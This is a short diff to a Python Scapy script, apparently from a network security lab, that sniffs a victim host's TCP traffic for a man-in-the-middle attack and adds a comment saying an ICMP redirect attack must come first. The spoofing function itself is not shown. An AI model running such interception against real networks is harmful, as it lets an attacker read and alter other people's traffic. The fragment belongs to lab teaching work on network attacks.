@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from scapy.all import send, sendp, TCP, IP, sniff
+from scapy.all import send, TCP, IP, sniff
 
 V_IP = '10.9.0.5'
 V_MAC = '02:42:0a:09:00:05'
@@ -33,5 +33,6 @@ print("LAUNCHING MITM ATTACK.........")
 f0 = 'tcp or udp'
 f1 = 'tcp and src host ' + V_IP
 f2 = 'tcp and (ether src ' +  V_MAC + ')'
+# require ICMP redirect attack on victim before modify the packet payload
 pkt = sniff(iface='br-49135dffbe40', filter=f1, prn=spoof_pkt)
 
